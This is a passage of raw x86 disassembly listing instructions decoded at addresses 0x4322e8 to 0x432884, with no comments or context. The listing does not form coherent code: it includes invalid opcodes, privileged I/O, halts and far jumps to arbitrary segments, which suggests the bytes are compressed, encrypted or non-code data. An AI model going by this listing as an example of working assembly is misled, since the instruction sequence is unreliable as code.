  4322e8:	69 b2 6c 4f a7 63 c1 	imul   $0xe8e2cdc1,0x63a74f6c(%edx),%esi
  4322ef:	cd e2 e8 
  4322f2:	5b                   	pop    %ebx
  4322f3:	ee                   	out    %al,(%dx)
  4322f4:	1f                   	pop    %ds
  4322f5:	f8                   	clc
  4322f6:	6d                   	insl   (%dx),%es:(%edi)
  4322f7:	0e                   	push   %cs
  4322f8:	11 7f 3f             	adc    %edi,0x3f(%edi)
  4322fb:	97                   	xchg   %eax,%edi
  4322fc:	48                   	dec    %eax
  4322fd:	2a 46 54             	sub    0x54(%esi),%al
  432300:	3b dc                	cmp    %esp,%ebx
  432302:	1d aa b6 b4 bd       	sbb    $0xbdb4b6aa,%eax
  432307:	5d                   	pop    %ebp
  432308:	a3 eb a6 66 87       	mov    %eax,0x8766a6eb
  43230d:	d9 a9 8d 08 90 0f    	fldcw  0xf90088d(%ecx)
  432313:	4a                   	dec    %edx
  432314:	bf cd f6 2e 68       	mov    $0x682ef6cd,%edi
  432319:	af                   	scas   %es:(%edi),%eax
  43231a:	c1 59 b7 f8          	rcrl   $0xf8,-0x49(%ecx)
  43231e:	08 0f                	or     %cl,(%edi)
  432320:	ba ff 74 60 33       	mov    $0x336074ff,%edx
  432325:	cf                   	iret
  432326:	43                   	inc    %ebx
  432327:	75 0b                	jne    0x432334
  432329:	9a cc 67 21 90 20 84 	lcall  $0x8420,$0x902167cc
  432330:	4d                   	dec    %ebp
  432331:	20 ad 9d d4 bc 24    	and    %ch,0x24bcd49d(%ebp)
  432337:	c6                   	(bad)
  432338:	e5 1d                	in     $0x1d,%eax
  43233a:	59                   	pop    %ecx
  43233b:	53                   	push   %ebx
  43233c:	ed                   	in     (%dx),%eax
  43233d:	09 29                	or     %ebp,(%ecx)
  43233f:	d2 8c 41 d0 12 e6 15 	rorb   %cl,0x15e612d0(%ecx,%eax,2)
  432346:	5c                   	pop    %esp
  432347:	ff 1e                	lcall  *(%esi)
  432349:	28 bc ca 5d 00 6e 3d 	sub    %bh,0x3d6e005d(%edx,%ecx,8)
  432350:	68 42 c5 f4 78       	push   $0x78f4c542
  432355:	d8 2c c6             	fsubrs (%esi,%eax,8)
  432358:	55                   	push   %ebp
  432359:	e2 15                	loop   0x432370
  43235b:	88 b6 14 54 ed 0c    	mov    %dh,0xced5414(%esi)
  432361:	1d 9f ae dd 88       	sbb    $0x88ddae9f,%eax
  432366:	3d 39 d9 48 15       	cmp    $0x1548d939,%eax
  43236b:	c4 b7 67 a5 37 1b    	les    0x1b37a567(%edi),%esi
  432371:	74 4e                	je     0x4323c1
  432373:	e2 c6                	loop   0x43233b
  432375:	79 3a                	jns    0x4323b1
  432377:	fd                   	std
  432378:	85 e4                	test   %esp,%esp
  43237a:	97                   	xchg   %eax,%edi
  43237b:	2e a3 33 fc 4b 1a    	mov    %eax,%cs:0x1a4bfc33
  432381:	45                   	inc    %ebp
  432382:	f4                   	hlt
  432383:	ab                   	stos   %eax,%es:(%edi)
  432384:	85 4f c9             	test   %ecx,-0x37(%edi)
  432387:	84 41 51             	test   %al,0x51(%ecx)
  43238a:	3f                   	aas
  43238b:	dc 9d 2b 81 5d ea    	fcompl -0x15a27ed5(%ebp)
  432391:	f5                   	cmc
  432392:	e2 9f                	loop   0x432333
  432394:	8a 78 f0             	mov    -0x10(%eax),%bh
  432397:	01 55 43             	add    %edx,0x43(%ebp)
  43239a:	67 90                	addr16 nop
  43239c:	e2 8b                	loop   0x432329
  43239e:	06                   	push   %es
  43239f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4323a0:	2f                   	das
  4323a1:	ca b1 47             	lret   $0x47b1
  4323a4:	f9                   	stc
  4323a5:	20 3a                	and    %bh,(%edx)
  4323a7:	02 9f ae b5 87 10    	add    0x1087b5ae(%edi),%bl
  4323ad:	85 a5 49 3b 0b ea    	test   %esp,-0x15f4c4b7(%ebp)
  4323b3:	cd ce                	int    $0xce
  4323b5:	8f                   	(bad)
  4323b6:	31 ea                	xor    %ebp,%edx
  4323b8:	44                   	inc    %esp
  4323b9:	43                   	inc    %ebx
  4323ba:	c5 f5 14 93 76 3d 99 	vunpcklpd 0x10993d76(%ebx),%ymm1,%ymm2
  4323c1:	10 
  4323c2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4323c3:	57                   	push   %edi
  4323c4:	64 34 8a             	fs xor $0x8a,%al
  4323c7:	7e ac                	jle    0x432375
  4323c9:	0c e5                	or     $0xe5,%al
  4323cb:	31 c8                	xor    %ecx,%eax
  4323cd:	58                   	pop    %eax
  4323ce:	c7                   	(bad)
  4323cf:	fc                   	cld
  4323d0:	51                   	push   %ecx
  4323d1:	5c                   	pop    %esp
  4323d2:	3a e8                	cmp    %al,%ch
  4323d4:	b5 f5                	mov    $0xf5,%ch
  4323d6:	36 19 36             	sbb    %esi,%ss:(%esi)
  4323d9:	e7 36                	out    %eax,$0x36
  4323db:	4a                   	dec    %edx
  4323dc:	85 17                	test   %edx,(%edi)
  4323de:	07                   	pop    %es
  4323df:	53                   	push   %ebx
  4323e0:	59                   	pop    %ecx
  4323e1:	66 54                	push   %sp
  4323e3:	b3 59                	mov    $0x59,%bl
  4323e5:	49                   	dec    %ecx
  4323e6:	1c 34                	sbb    $0x34,%al
  4323e8:	f0 4e                	lock dec %esi
  4323ea:	5d                   	pop    %ebp
  4323eb:	20 5f cc             	and    %bl,-0x34(%edi)
  4323ee:	be cd b2 67 2b       	mov    $0x2b67b2cd,%esi
  4323f3:	5c                   	pop    %esp
  4323f4:	66 63 ab 4b ce 58 1e 	arpl   %bp,0x1e58ce4b(%ebx)
  4323fb:	df 0e                	fisttps (%esi)
  4323fd:	06                   	push   %es
  4323fe:	28 ce                	sub    %cl,%dh
  432400:	2d 00 b3 4c bb       	sub    $0xbb4cb300,%eax
  432405:	09 e8                	or     %ebp,%eax
  432407:	d9 53 24             	fsts   0x24(%ebx)
  43240a:	2a 09                	sub    (%ecx),%cl
  43240c:	e3 2f                	jecxz  0x43243d
  43240e:	7a c5                	jp     0x4323d5
  432410:	39 99 19 fa 17 0c    	cmp    %ebx,0xc17fa19(%ecx)
  432416:	65 1d 18 36 cf 90    	gs sbb $0x90cf3618,%eax
  43241c:	77 84                	ja     0x4323a2
  43241e:	21 5e f1             	and    %ebx,-0xf(%esi)
  432421:	c5 04 42             	lds    (%edx,%eax,2),%eax
  432424:	b4 d7                	mov    $0xd7,%ah
  432426:	d1 05 41 f6 d1 fb    	roll   $1,0xfbd1f641
  43242c:	c3                   	ret
  43242d:	7a fc                	jp     0x43242b
  43242f:	f4                   	hlt
  432430:	b2 54                	mov    $0x54,%dl
  432432:	94                   	xchg   %eax,%esp
  432433:	8c a3 4f ed 5a 54    	mov    %fs,0x545aed4f(%ebx)
  432439:	1c fb                	sbb    $0xfb,%al
  43243b:	2e 42                	cs inc %edx
  43243d:	93                   	xchg   %eax,%ebx
  43243e:	ac                   	lods   %ds:(%esi),%al
  43243f:	6c                   	insb   (%dx),%es:(%edi)
  432440:	ed                   	in     (%dx),%eax
  432441:	50                   	push   %eax
  432442:	d9 d5                	(bad)
  432444:	17                   	pop    %ss
  432445:	9d                   	popf
  432446:	f4                   	hlt
  432447:	0c 82                	or     $0x82,%al
  432449:	8e 47 f0             	mov    -0x10(%edi),%es
  43244c:	b8 1f 37 4f 90       	mov    $0x904f371f,%eax
  432451:	1c 1d                	sbb    $0x1d,%al
  432453:	f9                   	stc
  432454:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432455:	8c e1                	mov    %fs,%ecx
  432457:	89 61 7a             	mov    %esp,0x7a(%ecx)
  43245a:	12 da                	adc    %dl,%bl
  43245c:	73 ba                	jae    0x432418
  43245e:	cd fd                	int    $0xfd
  432460:	37                   	aaa
  432461:	21 51 6a             	and    %edx,0x6a(%ecx)
  432464:	75 ff                	jne    0x432465
  432466:	09 12                	or     %edx,(%edx)
  432468:	d7                   	xlat   %ds:(%ebx)
  432469:	2f                   	das
  43246a:	b4 24                	mov    $0x24,%ah
  43246c:	fc                   	cld
  43246d:	25 25 f6 1a 4b       	and    $0x4b1af625,%eax
  432472:	e8 8f f3 53 a6       	call   0xa6971806
  432477:	f1                   	int1
  432478:	8c 85 6b 7c 44 eb    	mov    %es,-0x14bb8395(%ebp)
  43247e:	d7                   	xlat   %ds:(%ebx)
  43247f:	b4 76                	mov    $0x76,%ah
  432481:	d7                   	xlat   %ds:(%ebx)
  432482:	e7 82                	out    %eax,$0x82
  432484:	7d 64                	jge    0x4324ea
  432486:	03 4c 80 37          	add    0x37(%eax,%eax,4),%ecx
  43248a:	f9                   	stc
  43248b:	11 f3                	adc    %esi,%ebx
  43248d:	b1 5e                	mov    $0x5e,%cl
  43248f:	4a                   	dec    %edx
  432490:	13 4f 02             	adc    0x2(%edi),%ecx
  432493:	71 af                	jno    0x432444
  432495:	8b 33                	mov    (%ebx),%esi
  432497:	a0 d6 48 bb 70       	mov    0x70bb48d6,%al
  43249c:	b7 42                	mov    $0x42,%bh
  43249e:	1d c8 52 7b 8c       	sbb    $0x8c7b52c8,%eax
  4324a3:	e7 71                	out    %eax,$0x71
  4324a5:	b0 0d                	mov    $0xd,%al
  4324a7:	16                   	push   %ss
  4324a8:	68 58 d5 5b 95       	push   $0x955bd558
  4324ad:	14 af                	adc    $0xaf,%al
  4324af:	97                   	xchg   %eax,%edi
  4324b0:	6c                   	insb   (%dx),%es:(%edi)
  4324b1:	da a8 ca c9 e7 9c    	fisubrl -0x63183636(%eax)
  4324b7:	21 fc                	and    %edi,%esp
  4324b9:	e3 55                	jecxz  0x432510
  4324bb:	cb                   	lret
  4324bc:	d5 d7                	aad    $0xd7
  4324be:	6a 25                	push   $0x25
  4324c0:	bf d2 b8 56 53       	mov    $0x5356b8d2,%edi
  4324c5:	4e                   	dec    %esi
  4324c6:	e8 ed 91 c1 e7       	call   0xe804b6b8
  4324cb:	50                   	push   %eax
  4324cc:	b8 9f 5a 82 48       	mov    $0x48825a9f,%eax
  4324d1:	a3 5e 39 52 ed       	mov    %eax,0xed52395e
  4324d6:	58                   	pop    %eax
  4324d7:	a1 53 dd fa c6       	mov    0xc6fadd53,%eax
  4324dc:	5e                   	pop    %esi
  4324dd:	23 be d2 a7 68 36    	and    0x3668a7d2(%esi),%edi
  4324e3:	08 23                	or     %ah,(%ebx)
  4324e5:	2f                   	das
  4324e6:	1c 6d                	sbb    $0x6d,%al
  4324e8:	e1 49                	loope  0x432533
  4324ea:	99                   	cltd
  4324eb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4324ec:	6a 5c                	push   $0x5c
  4324ee:	49                   	dec    %ecx
  4324ef:	d8 a2 ce 74 70 e0    	fsubs  -0x1f8f8b32(%edx)
  4324f5:	41                   	inc    %ecx
  4324f6:	57                   	push   %edi
  4324f7:	19 b5 a8 c6 f4 b0    	sbb    %esi,-0x4f0b3958(%ebp)
  4324fd:	0b 1d 8d 45 ff 62    	or     0x62ff458d,%ebx
  432503:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  432504:	b0 d4                	mov    $0xd4,%al
  432506:	13 50 0c             	adc    0xc(%eax),%edx
  432509:	64 59                	fs pop %ecx
  43250b:	fb                   	sti
  43250c:	93                   	xchg   %eax,%ebx
  43250d:	bb e1 f2 39 8f       	mov    $0x8f39f2e1,%ebx
  432512:	25 16 e4 09 00       	and    $0x9e416,%eax
  432517:	e5 d2                	in     $0xd2,%eax
  432519:	34 79                	xor    $0x79,%al
  43251b:	e1 e5                	loope  0x432502
  43251d:	b5 f7                	mov    $0xf7,%ch
  43251f:	2d c2 a6 38 42       	sub    $0x4238a6c2,%eax
  432524:	92                   	xchg   %eax,%edx
  432525:	bc 4f fd 27 4a       	mov    $0x4a27fd4f,%esp
  43252a:	e7 a9                	out    %eax,$0xa9
  43252c:	b1 a5                	mov    $0xa5,%cl
  43252e:	ea bc 6d 5f 49 37 a3 	ljmp   $0xa337,$0x495f6dbc
  432535:	b5 c4                	mov    $0xc4,%ch
  432537:	1f                   	pop    %ds
  432538:	c0 6d c9 e8          	shrb   $0xe8,-0x37(%ebp)
  43253c:	fd                   	std
  43253d:	b7 21                	mov    $0x21,%bh
  43253f:	42                   	inc    %edx
  432540:	8c c0                	mov    %es,%eax
  432542:	ec                   	in     (%dx),%al
  432543:	5f                   	pop    %edi
  432544:	68 7c 0d f0 8e       	push   $0x8ef00d7c
  432549:	24 5f                	and    $0x5f,%al
  43254b:	5a                   	pop    %edx
  43254c:	1e                   	push   %ds
  43254d:	f1                   	int1
  43254e:	23 13                	and    (%ebx),%edx
  432550:	b9 53 69 c4 97       	mov    $0x97c46953,%ecx
  432555:	eb 5e                	jmp    0x4325b5
  432557:	0d 4c 29 e9 b9       	or     $0xb9e9294c,%eax
  43255c:	67 d1 78 39          	sarl   $1,0x39(%bx,%si)
  432560:	4f                   	dec    %edi
  432561:	77 62                	ja     0x4325c5
  432563:	3a c8                	cmp    %al,%cl
  432565:	b0 14                	mov    $0x14,%al
  432567:	03 4e 0e             	add    0xe(%esi),%ecx
  43256a:	38 10                	cmp    %dl,(%eax)
  43256c:	9d                   	popf
  43256d:	fa                   	cli
  43256e:	40                   	inc    %eax
  43256f:	5b                   	pop    %ebx
  432570:	75 aa                	jne    0x43251c
  432572:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432573:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432574:	04 d6                	add    $0xd6,%al
  432576:	7f a4                	jg     0x43251c
  432578:	82 35 7f d3 ec 2c e7 	xorb   $0xe7,0x2cecd37f
  43257f:	24 26                	and    $0x26,%al
  432581:	d0 15 d2 a7 79 ae    	rclb   $1,0xae79a7d2
  432587:	b4 f9                	mov    $0xf9,%ah
  432589:	01 d8                	add    %ebx,%eax
  43258b:	45                   	inc    %ebp
  43258c:	31 71 43             	xor    %esi,0x43(%ecx)
  43258f:	49                   	dec    %ecx
  432590:	7b 26                	jnp    0x4325b8
  432592:	cb                   	lret
  432593:	66 95                	xchg   %ax,%bp
  432595:	a2 7a 46 ff 66       	mov    %al,0x66ff467a
  43259a:	5b                   	pop    %ebx
  43259b:	7c 68                	jl     0x432605
  43259d:	5d                   	pop    %ebp
  43259e:	61                   	popa
  43259f:	78 80                	js     0x432521
  4325a1:	2f                   	das
  4325a2:	ab                   	stos   %eax,%es:(%edi)
  4325a3:	5d                   	pop    %ebp
  4325a4:	29 f3                	sub    %esi,%ebx
  4325a6:	33 b7 91 34 c8 99    	xor    -0x6637cb6f(%edi),%esi
  4325ac:	6a ce                	push   $0xffffffce
  4325ae:	b0 56                	mov    $0x56,%al
  4325b0:	d0 06                	rolb   $1,(%esi)
  4325b2:	30 c6                	xor    %al,%dh
  4325b4:	19 73 52             	sbb    %esi,0x52(%ebx)
  4325b7:	5c                   	pop    %esp
  4325b8:	31 59 31             	xor    %ebx,0x31(%ecx)
  4325bb:	4c                   	dec    %esp
  4325bc:	f4                   	hlt
  4325bd:	8c ae 3a b3 83 b8    	mov    %gs,-0x477c4cc6(%esi)
  4325c3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4325c4:	0f ca                	bswap  %edx
  4325c6:	55                   	push   %ebp
  4325c7:	86 86 de c0 89 4c    	xchg   %al,0x4c89c0de(%esi)
  4325cd:	af                   	scas   %es:(%edi),%eax
  4325ce:	94                   	xchg   %eax,%esp
  4325cf:	1e                   	push   %ds
  4325d0:	92                   	xchg   %eax,%edx
  4325d1:	4a                   	dec    %edx
  4325d2:	ce                   	into
  4325d3:	15 54 df 5d 91       	adc    $0x915ddf54,%eax
  4325d8:	74 f0                	je     0x4325ca
  4325da:	c8 72 df 85          	enter  $0xdf72,$0x85
  4325de:	4c                   	dec    %esp
  4325df:	43                   	inc    %ebx
  4325e0:	43                   	inc    %ebx
  4325e1:	59                   	pop    %ecx
  4325e2:	9a 9b 98 ae 12 cb 04 	lcall  $0x4cb,$0x12ae989b
  4325e9:	eb 34                	jmp    0x43261f
  4325eb:	d7                   	xlat   %ds:(%ebx)
  4325ec:	b0 ea                	mov    $0xea,%al
  4325ee:	2e 20 a9 22 bd 7c 1e 	and    %ch,%cs:0x1e7cbd22(%ecx)
  4325f5:	77 04                	ja     0x4325fb
  4325f7:	a1 51 4b 25 c4       	mov    0xc4254b51,%eax
  4325fc:	f9                   	stc
  4325fd:	05 e9 5f f4 fe       	add    $0xfef45fe9,%eax
  432602:	60                   	pusha
  432603:	fd                   	std
  432604:	c3                   	ret
  432605:	c8 6b 74 1a          	enter  $0x746b,$0x1a
  432609:	f4                   	hlt
  43260a:	36 89 0a             	mov    %ecx,%ss:(%edx)
  43260d:	88 e7                	mov    %ah,%bh
  43260f:	82 da 2c             	sbb    $0x2c,%dl
  432612:	e2 05                	loop   0x432619
  432614:	4b                   	dec    %ebx
  432615:	1c 70                	sbb    $0x70,%al
  432617:	e8 ca 5b 01 4b       	call   0x4b4481e6
  43261c:	20 13                	and    %dl,(%ebx)
  43261e:	5f                   	pop    %edi
  43261f:	fe cc                	dec    %ah
  432621:	d6                   	salc
  432622:	ac                   	lods   %ds:(%esi),%al
  432623:	83 c2 28             	add    $0x28,%edx
  432626:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432627:	db 5c 4c c8          	fistpl -0x38(%esp,%ecx,2)
  43262b:	fe                   	(bad)
  43262c:	d8 b3 97 da d7 98    	fdivs  -0x67282569(%ebx)
  432632:	ea 84 92 79 0c ad dd 	ljmp   $0xddad,$0xc799284
  432639:	2b a7 c2 f0 01 e3    	sub    -0x1cfe0f3e(%edi),%esp
  43263f:	8e e9                	mov    %ecx,%gs
  432641:	b3 7c                	mov    $0x7c,%bl
  432643:	3e a8 f0             	ds test $0xf0,%al
  432646:	96                   	xchg   %eax,%esi
  432647:	37                   	aaa
  432648:	88 6e 9a             	mov    %ch,-0x66(%esi)
  43264b:	45                   	inc    %ebp
  43264c:	70 98                	jo     0x4325e6
  43264e:	93                   	xchg   %eax,%ebx
  43264f:	9a 6b cd 8f 96 0e 96 	lcall  $0x960e,$0x968fcd6b
  432656:	ed                   	in     (%dx),%eax
  432657:	56                   	push   %esi
  432658:	8d 2f                	lea    (%edi),%ebp
  43265a:	f4                   	hlt
  43265b:	fc                   	cld
  43265c:	2e 5a                	cs pop %edx
  43265e:	45                   	inc    %ebp
  43265f:	e2 c3                	loop   0x432624
  432661:	bc c0 c5 f3 d3       	mov    $0xd3f3c5c0,%esp
  432666:	c7                   	(bad)
  432667:	ea 37 80 7e 9d 6f 2e 	ljmp   $0x2e6f,$0x9d7e8037
  43266e:	67 82 5c c3 0f       	sbbb   $0xf,-0x3d(%si)
  432673:	2d ee e7 62 0a       	sub    $0xa62e7ee,%eax
  432678:	58                   	pop    %eax
  432679:	10 50 89             	adc    %dl,-0x77(%eax)
  43267c:	27                   	daa
  43267d:	45                   	inc    %ebp
  43267e:	b9 44 e0 04 1a       	mov    $0x1a04e044,%ecx
  432683:	1e                   	push   %ds
  432684:	61                   	popa
  432685:	9d                   	popf
  432686:	15 2e 20 e0 98       	adc    $0x98e0202e,%eax
  43268b:	2f                   	das
  43268c:	f2 df 60 fc          	repnz fbld -0x4(%eax)
  432690:	1b e3                	sbb    %ebx,%esp
  432692:	ca 3c 83             	lret   $0x833c
  432695:	f6 43 29 b7          	testb  $0xb7,0x29(%ebx)
  432699:	3d 2b 4f 25 49       	cmp    $0x49254f2b,%eax
  43269e:	b6 71                	mov    $0x71,%dh
  4326a0:	7f b1                	jg     0x432653
  4326a2:	9a 11 08 f7 9f 41 b8 	lcall  $0xb841,$0x9ff70811
  4326a9:	45                   	inc    %ebp
  4326aa:	76 9d                	jbe    0x432649
  4326ac:	d4 20                	aam    $0x20
  4326ae:	bb 79 3a 9f 12       	mov    $0x129f3a79,%ebx
  4326b3:	f4                   	hlt
  4326b4:	8f                   	(bad)
  4326b5:	4c                   	dec    %esp
  4326b6:	0b c5                	or     %ebp,%eax
  4326b8:	d7                   	xlat   %ds:(%ebx)
  4326b9:	3f                   	aas
  4326ba:	9f                   	lahf
  4326bb:	05 57 a0 fb 68       	add    $0x68fba057,%eax
  4326c0:	ba 3c 87 25 e4       	mov    $0xe425873c,%edx
  4326c5:	5c                   	pop    %esp
  4326c6:	42                   	inc    %edx
  4326c7:	b7 34                	mov    $0x34,%bh
  4326c9:	43                   	inc    %ebx
  4326ca:	b6 d3                	mov    $0xd3,%dh
  4326cc:	a0 75 39 c2 07       	mov    0x7c23975,%al
  4326d1:	13 7f 92             	adc    -0x6e(%edi),%edi
  4326d4:	b7 0f                	mov    $0xf,%bh
  4326d6:	4b                   	dec    %ebx
  4326d7:	f5                   	cmc
  4326d8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4326d9:	4d                   	dec    %ebp
  4326da:	cd 7c                	int    $0x7c
  4326dc:	1c 9d                	sbb    $0x9d,%al
  4326de:	e6 ad                	out    %al,$0xad
  4326e0:	5d                   	pop    %ebp
  4326e1:	81 0a b7 77 29 79    	orl    $0x792977b7,(%edx)
  4326e7:	76 dd                	jbe    0x4326c6
  4326e9:	ac                   	lods   %ds:(%esi),%al
  4326ea:	b1 e0                	mov    $0xe0,%cl
  4326ec:	32 47 80             	xor    -0x80(%edi),%al
  4326ef:	cb                   	lret
  4326f0:	8c 2b                	mov    %gs,(%ebx)
  4326f2:	23 d4                	and    %esp,%edx
  4326f4:	09 31                	or     %esi,(%ecx)
  4326f6:	ff                   	ljmp   (bad)
  4326f7:	eb 50                	jmp    0x432749
  4326f9:	27                   	daa
  4326fa:	ab                   	stos   %eax,%es:(%edi)
  4326fb:	10 d6                	adc    %dl,%dh
  4326fd:	62 7c d0 9a          	bound  %edi,-0x66(%eax,%edx,8)
  432701:	90                   	nop
  432702:	81 e5 a6 de b0 3d    	and    $0x3db0dea6,%ebp
  432708:	75 5d                	jne    0x432767
  43270a:	47                   	inc    %edi
  43270b:	e2 ee                	loop   0x4326fb
  43270d:	16                   	push   %ss
  43270e:	da 9a 2e 96 c8 fb    	ficompl -0x43769d2(%edx)
  432714:	8a 74 de 4b          	mov    0x4b(%esi,%ebx,8),%dh
  432718:	48                   	dec    %eax
  432719:	64 80 a7 3c 83 6e b0 	andb   $0xf4,%fs:-0x4f917cc4(%edi)
  432720:	f4 
  432721:	44                   	inc    %esp
  432722:	89 7f c0             	mov    %edi,-0x40(%edi)
  432725:	c3                   	ret
  432726:	81 6e 03 2c 45 60 50 	subl   $0x5060452c,0x3(%esi)
  43272d:	54                   	push   %esp
  43272e:	57                   	push   %edi
  43272f:	dd ba b8 dd 10 13    	fnstsw 0x1310ddb8(%edx)
  432735:	de 37                	fidivs (%edi)
  432737:	88 e7                	mov    %ah,%bh
  432739:	53                   	push   %ebx
  43273a:	b8 2b 84 fc 83       	mov    $0x83fc842b,%eax
  43273f:	5d                   	pop    %ebp
  432740:	91                   	xchg   %eax,%ecx
  432741:	66 53                	push   %bx
  432743:	47                   	inc    %edi
  432744:	7e 33                	jle    0x432779
  432746:	a2 0c 59 64 db       	mov    %al,0xdb64590c
  43274b:	93                   	xchg   %eax,%ebx
  43274c:	03 e2                	add    %edx,%esp
  43274e:	16                   	push   %ss
  43274f:	66 3e 7a 06          	data16 jp,pt 0x432759
  432753:	fa                   	cli
  432754:	e6 c9                	out    %al,$0xc9
  432756:	d3 ab 2f 93 a2 82    	shrl   %cl,-0x7d5d6cd1(%ebx)
  43275c:	20 a9 c4 87 f1 1c    	and    %ch,0x1cf187c4(%ecx)
  432762:	4b                   	dec    %ebx
  432763:	0f e9 46 a9          	psubsw -0x57(%esi),%mm0
  432767:	01 95 54 c1 9e f2    	add    %edx,-0xd613eac(%ebp)
  43276d:	1f                   	pop    %ds
  43276e:	a9 5c 22 66 86       	test   $0x8666225c,%eax
  432773:	1f                   	pop    %ds
  432774:	52                   	push   %edx
  432775:	87 2f                	xchg   %ebp,(%edi)
  432777:	22 9f 96 46 dd da    	and    -0x2522b96a(%edi),%bl
  43277d:	4f                   	dec    %edi
  43277e:	02 ba f0 f2 18 75    	add    0x7518f2f0(%edx),%bh
  432784:	a1 1b a5 ec cd       	mov    0xcdeca51b,%eax
  432789:	9b                   	fwait
  43278a:	ec                   	in     (%dx),%al
  43278b:	f1                   	int1
  43278c:	33 df                	xor    %edi,%ebx
  43278e:	e2 4b                	loop   0x4327db
  432790:	29 69 62             	sub    %ebp,0x62(%ecx)
  432793:	4c                   	dec    %esp
  432794:	6d                   	insl   (%dx),%es:(%edi)
  432795:	18 30                	sbb    %dh,(%eax)
  432797:	89 0c 02             	mov    %ecx,(%edx,%eax,1)
  43279a:	26 62 b2 3a 27 76 20 	bound  %esi,%es:0x2076273a(%edx)
  4327a1:	5c                   	pop    %esp
  4327a2:	38 ad 2e ab c3 a2    	cmp    %ch,-0x5d3c54d2(%ebp)
  4327a8:	bb e0 aa 62 ca       	mov    $0xca62aae0,%ebx
  4327ad:	54                   	push   %esp
  4327ae:	dd 4b 1a             	fisttpll 0x1a(%ebx)
  4327b1:	78 ad                	js     0x432760
  4327b3:	b0 9b                	mov    $0x9b,%al
  4327b5:	45                   	inc    %ebp
  4327b6:	dd a3 ed b7 70 82    	frstor -0x7d8f4813(%ebx)
  4327bc:	54                   	push   %esp
  4327bd:	64 c8 cf 94 2a       	fs enter $0x94cf,$0x2a
  4327c2:	c1 aa d5 95 3d e1 60 	shrl   $0x60,-0x1ec26a2b(%edx)
  4327c9:	c3                   	ret
  4327ca:	87 3d 65 be e6 66    	xchg   %edi,0x66e6be65
  4327d0:	ec                   	in     (%dx),%al
  4327d1:	ac                   	lods   %ds:(%esi),%al
  4327d2:	08 3e                	or     %bh,(%esi)
  4327d4:	12 5f 40             	adc    0x40(%edi),%bl
  4327d7:	fb                   	sti
  4327d8:	db 30                	(bad) (%eax)
  4327da:	06                   	push   %es
  4327db:	2d 1c 3b 4b 5a       	sub    $0x5a4b3b1c,%eax
  4327e0:	29 79 aa             	sub    %edi,-0x56(%ecx)
  4327e3:	c5 51 b1             	lds    -0x4f(%ecx),%edx
  4327e6:	9c                   	pushf
  4327e7:	c4 27                	les    (%edi),%esp
  4327e9:	93                   	xchg   %eax,%ebx
  4327ea:	95                   	xchg   %eax,%ebp
  4327eb:	d2 24 5e             	shlb   %cl,(%esi,%ebx,2)
  4327ee:	9e                   	sahf
  4327ef:	fc                   	cld
  4327f0:	04 3e                	add    $0x3e,%al
  4327f2:	97                   	xchg   %eax,%edi
  4327f3:	aa                   	stos   %al,%es:(%edi)
  4327f4:	96                   	xchg   %eax,%esi
  4327f5:	d5 6f                	aad    $0x6f
  4327f7:	f2 54                	repnz push %esp
  4327f9:	9d                   	popf
  4327fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4327fb:	19 73 0f             	sbb    %esi,0xf(%ebx)
  4327fe:	04 7f                	add    $0x7f,%al
  432800:	84 73 7d             	test   %dh,0x7d(%ebx)
  432803:	4d                   	dec    %ebp
  432804:	c9                   	leave
  432805:	34 52                	xor    $0x52,%al
  432807:	fa                   	cli
  432808:	fd                   	std
  432809:	8e 6e 9a             	mov    -0x66(%esi),%gs
  43280c:	2c 79                	sub    $0x79,%al
  43280e:	d1 74 05 38          	shll   $1,0x38(%ebp,%eax,1)
  432812:	6f                   	outsl  %ds:(%esi),(%dx)
  432813:	ab                   	stos   %eax,%es:(%edi)
  432814:	f0 40                	lock inc %eax
  432816:	95                   	xchg   %eax,%ebp
  432817:	2b 78 b2             	sub    -0x4e(%eax),%edi
  43281a:	3f                   	aas
  43281b:	fb                   	sti
  43281c:	6c                   	insb   (%dx),%es:(%edi)
  43281d:	e6 05                	out    %al,$0x5
  43281f:	7d 24                	jge    0x432845
  432821:	e3 4c                	jecxz  0x43286f
  432823:	50                   	push   %eax
  432824:	c4 90 7a 91 7a b6    	les    -0x49856e86(%eax),%edx
  43282a:	ab                   	stos   %eax,%es:(%edi)
  43282b:	6d                   	insl   (%dx),%es:(%edi)
  43282c:	3d dc d8 e0 97       	cmp    $0x97e0d8dc,%eax
  432831:	2c 9d                	sub    $0x9d,%al
  432833:	43                   	inc    %ebx
  432834:	7b ce                	jnp    0x432804
  432836:	21 27                	and    %esp,(%edi)
  432838:	d3 21                	shll   %cl,(%ecx)
  43283a:	fd                   	std
  43283b:	6d                   	insl   (%dx),%es:(%edi)
  43283c:	64 f2 c9             	fs repnz leave
  43283f:	63 70 35             	arpl   %esi,0x35(%eax)
  432842:	3a 42 3c             	cmp    0x3c(%edx),%al
  432845:	e0 6c                	loopne 0x4328b3
  432847:	ab                   	stos   %eax,%es:(%edi)
  432848:	fc                   	cld
  432849:	1c 00                	sbb    $0x0,%al
  43284b:	31 b4 d3 7b 15 b9 3d 	xor    %esi,0x3db9157b(%ebx,%edx,8)
  432852:	97                   	xchg   %eax,%edi
  432853:	d2 81 98 d9 3c ee    	rolb   %cl,-0x11c32668(%ecx)
  432859:	bd 0b 62 0a 85       	mov    $0x850a620b,%ebp
  43285e:	f4                   	hlt
  43285f:	de 1a                	ficomps (%edx)
  432861:	f2 45                	repnz inc %ebp
  432863:	e2 6e                	loop   0x4328d3
  432865:	85 a4 50 42 0a b2 2c 	test   %esp,0x2cb20a42(%eax,%edx,2)
  43286c:	c8 93 c5 2c          	enter  $0xc593,$0x2c
  432870:	2b 4b 2f             	sub    0x2f(%ebx),%ecx
  432873:	82 38 f9             	cmpb   $0xf9,(%eax)
  432876:	99                   	cltd
  432877:	d2 7f f2             	sarb   %cl,-0xe(%edi)
  43287a:	b0 91                	mov    $0x91,%al
  43287c:	d7                   	xlat   %ds:(%ebx)
  43287d:	3d f2 37 7a 20       	cmp    $0x207a37f2,%eax
  432882:	74 0a                	je     0x43288e
  432884:	91                   	xchg   %eax,%ecx
